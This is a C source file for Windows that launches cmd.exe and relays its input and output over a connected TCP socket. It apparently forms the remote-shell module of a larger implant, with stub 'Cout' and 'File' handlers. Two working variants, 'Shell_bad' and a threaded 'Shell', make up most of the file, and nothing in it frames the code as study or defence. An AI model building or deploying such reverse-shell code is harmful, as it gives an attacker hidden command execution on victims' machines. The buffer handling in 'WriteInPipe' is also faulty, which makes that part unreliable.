#include "includes.h"


int ScanOutPipe(HANDLE hStdoutRd, OVERLAPPED* readOverlapped, SOCKET sockt){
    DWORD bytesRead;
    char buf[2048];
    memset(&buf, 0, 2048);
    // MANUAL SIZE BUFFER KILL ME
    DBGLG("Entering Scan out pipe\n");
    int c = ReadFile(hStdoutRd, buf, 2048,&bytesRead, readOverlapped);
    printf("printing %s\n", &buf);
    // WaitForSingleObjectEx(readOverlapped->hEvent, 500, TRUE);
    if (send(sockt, buf, bytesRead, 0) < 0){
        perror("send in scanoutpipe died");
        return 1;
    }
    // WaitForSingleObjectEx(readOverlapped->hEvent, 500, TRUE);

    return 0;
}

int WriteInPipe(HANDLE hStdinWr, OVERLAPPED* writeOverlapped,  SOCKET sockt){
    DWORD bytesWritten;
    int len = 0;
    char input[1024] = {0};
    len = recv(sockt, (char*)&input, 1024, 0);
    printf("input: %s\n len is %d\n", input, len);

    // len <= 0 because when socket dies, recv return 0, rather than -1
    if (len <= 0){
        perror("recv in WriteInPipe died");
        return 1;
    }
    len++;
    input[len] = '\n';
    input[len + 1] = '\0';
    if (!WriteFile(hStdinWr, input, len, &bytesWritten, writeOverlapped)){
        perror("Writing to cmd died");
        return 1;
    }
    printf("quitting write in pipe\n");
    // WaitForSingleObject(writeOverlapped, 500);
    return 0;
}

int Shell_bad(PROCESS_INFORMATION pi, SOCKET sockt)
{
    int iResult;
    HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    // Create pipes for the child process's standard input and output.
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0) ||
        !CreatePipe(&hStdinRd, &hStdinWr, &sa, 0))
    {
        perror("failed at creating pipes for child process");
        return -1;
    }
    sa.bInheritHandle = TRUE;
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hStdinRd;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;
    OVERLAPPED writeOverlapped = { 0 };
    OVERLAPPED readOverlapped = { 0 };
    writeOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    readOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        perror("failed at creating process");
        closesocket(sockt);
        return -2;
    }
    CloseHandle(hStdoutWr);
    CloseHandle(hStdinRd);
    /* INITIAL CMD LOADING*/
    ScanOutPipe(hStdoutRd, &readOverlapped, sockt);
    ScanOutPipe(hStdoutRd, &readOverlapped, sockt);
    /*END OF LOADING*/
    DBGLG("End of loading extra stuff\n");
    while (1){
        iResult = WriteInPipe(hStdinWr, &writeOverlapped ,sockt);
        if (iResult){
            break;
        }
        iResult = ScanOutPipe(hStdoutRd, &readOverlapped, sockt);
        if(iResult){
            break;
        }
    }
    CloseHandle(hStdoutRd);
    CloseHandle(hStdinWr);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}



void redirectChildProcessIO(HANDLE hChildStdIn, HANDLE hChildStdOut) {
    SetStdHandle(STD_INPUT_HANDLE, hChildStdIn);
    SetStdHandle(STD_OUTPUT_HANDLE, hChildStdOut);
}

struct shell_arg{
    SOCKET sockfd;
    PROCESS_INFORMATION pi;
    HANDLE hChildStdInWrite;
};

// Thread function to forward data from socket to the child process
void forwardToChildProcess(void* param) {
    struct shell_arg* sa = (struct shell_arg*)param;
    SOCKET sockfd = sa->sockfd;
    HANDLE hChildStdInWrite = sa->hChildStdInWrite;
    PROCESS_INFORMATION pi = sa->pi;
    char buffer[1024];
    int bytesRead;
    while ((bytesRead = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
        // Write the received data to the child process
        DWORD bytesWritten;
        WriteFile(hChildStdInWrite, buffer, bytesRead, &bytesWritten, NULL);
    }

    // Handle the case when the socket is closed
    if (bytesRead == 0) {
        printf("Socket closed.\n");
        // Optionally, you can terminate the process here or take appropriate action.
        // For simplicity, we'll just exit the program.
        if (pi.hProcess != NULL){
            DBGLG("Killing cmd\n");
            TerminateProcess(pi.hProcess, 9);
        }
        exit(0);
    } else {
        perror("recv failed");
    }
}



int Shell(PROCESS_INFORMATION* pi, SOCKET sockfd) {
    // Assume the SOCKET 'sockfd' is already connected via TCP

    // Create pipes for communicating with the child process
    HANDLE hChildStdInRead, hChildStdInWrite, hChildStdOutRead, hChildStdOutWrite;
    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    // Create pipes for child process standard input and output
    CreatePipe(&hChildStdInRead, &hChildStdInWrite, &saAttr, 0);
    CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &saAttr, 0);

    // Create child process
    STARTUPINFO siStartInfo;
    ZeroMemory(pi, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    // siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdInput = hChildStdInRead;
    siStartInfo.hStdOutput = hChildStdOutWrite;
    siStartInfo.hStdError = hChildStdOutWrite;
    siStartInfo.dwFlags = STARTF_USESTDHANDLES;

    // Replace "YOUR_CLI_APP.exe" with the path to your external CLI application
    if (!CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, pi)) {
        DBGLG("Create process failed: ", GetLastError());
        exit(EXIT_FAILURE);
    }

    // Close unused ends of the pipes
    CloseHandle(hChildStdInRead);
    CloseHandle(hChildStdOutWrite);
    struct shell_arg sa = {sockfd, *pi, hChildStdInWrite};
    // Create a thread to read from the TCP socket and forward to the child process
    _beginthread(forwardToChildProcess, 0, (void*)&sa);

    // Continuously read from the child process and forward to the TCP socket
    char buffer[1024];
    DWORD bytesRead, bytesWritten;

    while (1) {
        if (!ReadFile(hChildStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) || bytesRead == 0) {
            break;
        }

        // Send the received output to the server through the TCP socket
        send(sockfd, buffer, bytesRead, 0);
    }

    // Wait for the child process to exit
    WaitForSingleObject(pi->hProcess, INFINITE);

    // Close handles and clean up
    CloseHandle(hChildStdInWrite);
    CloseHandle(hChildStdOutRead);
    CloseHandle(pi->hProcess);
    CloseHandle(pi->hThread);

    return 0;
}

int Cout(SOCKET sockt, ...)
{
    return -1;
}

int File(SOCKET sockt, ...)
{
    return -1;
}